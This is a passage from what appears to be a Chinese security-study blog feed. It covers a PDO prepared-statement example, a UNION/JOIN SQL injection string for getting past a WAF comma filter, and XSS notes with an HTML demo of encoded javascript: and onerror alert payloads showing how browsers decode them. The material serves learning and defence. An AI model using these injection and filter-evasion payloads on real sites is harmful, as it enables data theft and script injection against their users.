class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$st = $pdo-&amp;gt;prepare(&amp;quot;select * from users where id =?&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$id = $_GET[&amp;#x27;id&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$st-&amp;gt;bindParam(1, $id);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$st-&amp;gt;execute();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ret = $st-&amp;gt;fetchAll();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_r($ret);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVlemh4aW5nL3AvNTI4MjQzNy5odG1s&#34;&gt;PDO 防 sql 注入原理分析 - leezhxing - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过waf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过waf&#34;&gt;#&lt;/a&gt; 绕过 waf&lt;/h3&gt;
&lt;p&gt;1. 过滤，&lt;/p&gt;
&lt;p&gt;通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接&lt;/p&gt;
&lt;p&gt;select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/02/17/XSS/</guid>
            <title>XSS</title>
            <link>http://example.com/2022/02/17/XSS/</link>
            <category>XSS</category>
            <pubDate>Thu, 17 Feb 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;h2 id=&#34;session-cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#session-cookie&#34;&gt;#&lt;/a&gt; session || cookie&lt;/h2&gt;
&lt;p&gt;1.Cookie 的工作原理&lt;br&gt;
（1）浏览器端第一次发送请求到服务器端&lt;/p&gt;
&lt;p&gt;（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端&lt;/p&gt;
&lt;p&gt;（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie&lt;/p&gt;
&lt;p&gt;（4）服务器端通过 Cookie 中携带的数据区分不同的用户&lt;/p&gt;
&lt;p&gt;————————————————&lt;/p&gt;
&lt;p&gt;2.Session 的工作原理&lt;/p&gt;
&lt;p&gt;（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端&lt;/p&gt;
&lt;p&gt;（2）浏览器端发送第 N（N&amp;gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象&lt;/p&gt;
&lt;p&gt;（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。&lt;/p&gt;
&lt;p&gt;name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie&lt;/p&gt;
&lt;p&gt;name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象&lt;/p&gt;
&lt;p&gt;value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie&lt;/p&gt;
&lt;p&gt;value 为 SessionId 存在，返回 session 对象&lt;/p&gt;
&lt;p&gt;————————————————&lt;/p&gt;
&lt;p&gt;(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；&lt;/p&gt;
&lt;p&gt;(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session&lt;/p&gt;
&lt;p&gt;(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE&lt;/p&gt;
&lt;p&gt;(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。&lt;/p&gt;
&lt;p&gt;(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMzMzMzMzNjY3Ny9hcnRpY2xlL2RldGFpbHMvMTAwOTM5MDMw&#34;&gt;(62 条消息) Cookie 和 Session 的区别（面试必备）_秋风不识路的博客 - CSDN 博客_cookie 与 session 区别&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;1反射型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1反射型xss&#34;&gt;#&lt;/a&gt; 1. 反射型 xss&lt;/h2&gt;
&lt;p&gt;反射型 XSS 是非持久性、参数型的跨站脚本。反射型 XSS 的 JS 代码在 Web 应用的参数（变量）中，如搜 索框的反射型 XSS。在搜索框中，提交 PoC [scriptalert (/xss/)/script]，点击搜索，即可触发反射型 XSS。 注意到，我们提交的 poc 会出现在 search.php 页面的 keywords 参数中。&lt;/p&gt;
&lt;h2 id=&#34;2存储型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2存储型xss&#34;&gt;#&lt;/a&gt; 2. 存储型 XSS&lt;/h2&gt;
&lt;p&gt;存储型 XSS 是持久性跨站脚本。持久性体现在 XSS 代码不是在某个参数（变量）中，而是写进数据库或 文件等可以永久保存数据的介质中。存储型 XSS 通常发生在留言板等地方。我们在留言板位置留言，将 恶意代码写进数据库中。此时，我们只完成了第一步，将恶意代码写入数据库。因为 XSS 使用的 JS 代 码，JS 代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的 XSS 代码，才能真正触发 XSS。 此时，需要我们模拟网站后台管理员的身份，查看留言。&lt;/p&gt;
&lt;h2 id=&#34;3基于dom的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3基于dom的&#34;&gt;#&lt;/a&gt; 3. 基于 DOM 的&lt;/h2&gt;
&lt;p&gt;XSS DOM XSS 比较特殊。owasp 关于 DOM 型号 XSS 的定义是基于 DOM 的 XSS 是一种 XSS 攻击，其中攻击 的 payload 由于修改受害者浏览器页面的 DOM 树而执行的。其特殊的地方就是 payload 在浏览器本地修 改 DOM 树而执行， 并不会传到服务器上，这也就使得 DOM XSS 比较难以检测。&lt;/p&gt;
&lt;p&gt;URL 的每一个参数、URL 本身、表单、搜索框、常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等&lt;/p&gt;
&lt;h2 id=&#34;浏览器解析机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#浏览器解析机制&#34;&gt;#&lt;/a&gt; 浏览器解析机制&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;.&amp;lt;a href=&lt;span class=&#34;string&#34;&gt;&amp;quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&amp;quot;&lt;/span&gt;&amp;gt;aaa&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 解析不了,href后的编码会使用实体编码解析，不能解析url编码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//127.0.0.1:18888/javascript:alert%281%29&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;URL 编码 &lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert(1)&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;.&amp;lt;a href=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;amp;#x6a;&amp;amp;#x61;&amp;amp;#x76;&amp;amp;#x61;&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:%61%6c%65%72%74%28%32%29&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTML字符实体编码 &lt;span class=&#34;string&#34;&gt;&amp;quot;javascript&amp;quot;&lt;/span&gt; 和 URL 编码 &lt;span class=&#34;string&#34;&gt;&amp;quot;alert(2)&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JavaScript支持Unicode，hex，utf-&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;.&amp;lt;a href=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript%3aalert(3)&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;URL 编码 &lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  js不能编码符号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;.&amp;lt;div&amp;gt;&amp;amp;&lt;span class=&#34;comment&#34;&gt;#60;img src=x onerror=alert(4)&amp;amp;#62;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTML字符实体编码 &amp;lt; 和 &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  会解析但不会执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;.&amp;lt;textarea&amp;gt;&amp;amp;&lt;span class=&#34;comment&#34;&gt;#60;script&amp;amp;#62;alert(5)&amp;amp;#60;/script&amp;amp;#62;&amp;lt;/textarea&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTML字符实体编码 &amp;lt; 和 &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    会解析但不会执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;.&amp;lt;textarea&amp;gt;&amp;lt;script&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&amp;lt;/script&amp;gt;&amp;lt;/textarea&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    会解析但不会执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 不能解析 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;a href=&amp;quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&amp;quot;&amp;gt;aaa&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;a href=&amp;quot;javascript%3aalert(3)&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- js中符号不能编码 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;div&amp;gt;&amp;amp;#60;img src=x onerror=alert(4)&amp;amp;#62;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- html解析完不能执行，&amp;lt;不能编码，浏览器中直接显示img标签 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;textarea&amp;gt;&amp;amp;#60;script&amp;amp;#62;alert(5)&amp;amp;#60;/script&amp;amp;#62;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- textarea中的标签可以被解码，但不能被解析，&amp;lt;script&amp;gt;alert(5)&amp;lt;/script&amp;gt; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;textarea&amp;gt;&amp;lt;script&amp;gt;alert(6)&amp;lt;/script&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- textarea中所有标签都不能被解析 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;button onclick=&amp;quot;confirm(&amp;#x27;8\u0027);&amp;quot;&amp;gt;Button&amp;lt;/button&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 不能编码符号 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116&amp;amp;#40;&amp;amp;#57;&amp;amp;#41;&amp;amp;#59&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 原始字符块只能容纳文本，会被解析为文本 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 不能对()及其里面的内容编码 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 同理 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;alert(&amp;#x27;14\u000a)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- Unicode 编码换行符（0x0A）,但不会引起真正的换行 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 可以解析 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;a href=&amp;quot;&amp;amp;#x6a;&amp;amp;#x61;&amp;amp;#x76;&amp;amp;#x61;&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;&amp;amp;#x3a;&amp;amp;#x61;&amp;amp;#x6c;&amp;amp;#x65;&amp;amp;#x72;&amp;amp;#x74;&amp;amp;#x28;&amp;amp;#x31;&amp;amp;#x29;&amp;quot;&amp;gt;bbb&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 直接通过html解析 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;a href=&amp;quot;&amp;amp;#x6a;&amp;amp;#x61;&amp;amp;#x76;&amp;amp;#x61;&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:%61%6c%65%72%74%28%32%29&amp;quot;&amp;gt;ccc&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 通过html解析为javascript，js在解析url编码 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;button onclick=&amp;quot;confirm(&amp;#x27;7&amp;amp;#39;);&amp;quot;&amp;gt;Button&amp;lt;/button&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 先html解析，编码，再给js解析 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;\u0061\u006c\u0065\u0072\u0074(10);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;!-- 编码alert，函数名可以解析 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&amp;#x27;&amp;lt;&amp;#x27;符号&amp;#x27;（后面没有跟&amp;#x27;/&amp;#x27;符号）&amp;#x27;就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input value=&amp;quot;xxx&amp;quot;&amp;gt;  由于没有&amp;gt;,value中的内容无法进入数据状态解析&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;textarea&amp;gt;&amp;amp;#60;script&amp;amp;#62;alert(5)&amp;amp;#60;/script&amp;amp;#62;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;textarea&amp;gt;由于有完整的&amp;lt;&amp;gt;，因此可以解析后面的内容，把&amp;amp;#60解析为&amp;lt;,但不会进入数据开始状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    不能对协议类型进行任何的编码操作&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结：&lt;/p&gt;
&lt;p&gt;浏览器解析顺序：URL 解析器 -&amp;gt;HTML 解析器 -&amp;gt; CSS 解析器 -&amp;gt;JS 解析器&lt;/p&gt;
&lt;p&gt;不能对协议进行编码 javascript:   (包含：)&lt;/p&gt;
&lt;h3 id=&#34;html解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#html解析&#34;&gt;#&lt;/a&gt; HTML 解析&lt;/h3&gt;
